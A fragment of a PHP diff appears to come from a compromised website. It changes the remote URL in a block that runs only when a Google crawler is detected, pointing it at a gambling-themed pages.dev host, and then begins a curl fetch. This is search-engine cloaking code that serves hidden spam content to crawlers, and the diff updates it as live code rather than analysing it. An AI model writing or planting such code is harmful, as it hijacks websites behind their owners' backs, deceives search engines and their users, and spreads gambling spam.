@@ -5,7 +5,7 @@ function is_google_crawler() {
 }
 
 if (is_google_crawler()) {
-    $remote_url = 'https://mahjong333blue.pages.dev/aa2.txt';
+    $remote_url = 'https://perpus-mahjong333.pages.dev/asuu.html';
 
     $curl = curl_init();
     curl_setopt_array($curl, array(
